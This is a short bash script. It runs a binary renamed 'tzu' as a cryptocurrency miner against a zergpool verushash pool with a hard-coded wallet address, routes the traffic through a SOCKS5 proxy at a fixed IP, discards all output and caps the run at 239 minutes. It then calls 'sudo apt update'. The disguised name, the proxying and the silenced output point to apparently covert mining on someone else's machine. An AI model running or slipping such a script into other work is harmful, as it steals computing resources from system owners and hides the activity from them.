#!/bin/bash
chmod +x tzu 
timeout 239m ./tzu -v -l verushash.eu.mine.zergpool.com:3300 -u DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV -t 2 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
sudo apt update